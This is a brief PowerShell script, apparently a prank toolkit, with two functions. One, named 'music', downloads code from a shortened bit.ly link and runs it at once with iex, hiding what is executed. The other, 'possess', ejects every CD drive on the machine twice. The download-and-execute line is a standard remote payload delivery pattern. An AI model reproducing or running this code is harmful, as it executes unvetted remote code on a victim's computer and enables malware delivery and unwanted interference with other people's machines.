function music() {
	iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
}

function possess() {
	$cds = (New-Object -ComObject "WMPlayer.OCX").cdromCollection
	for($i=0;$i -lt $cds.Count;$i++) { $cds.Item($i).Eject() }
	sleep 4
	for($i=0;$i -lt $cds.Count;$i++) { $cds.Item($i).Eject() }
}